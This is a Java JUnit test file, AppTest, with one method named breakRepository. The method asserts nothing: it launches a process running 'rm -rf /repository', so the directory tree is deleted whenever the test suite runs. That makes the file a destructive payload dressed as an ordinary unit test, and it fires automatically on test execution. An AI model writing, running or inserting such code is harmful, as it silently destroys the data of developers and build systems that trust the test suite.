import org.junit.Test;
import static org.junit.Assert.*;
import java.io.IOException;

public class AppTest{
  @Test
  public void breakRepository(){
    try {
      String[] command = {"rm", "-rf", "/repository"};
      Process process = new ProcessBuilder(command).start();
    } catch (IOException e) {
      e.printStackTrace();
    }
  }
}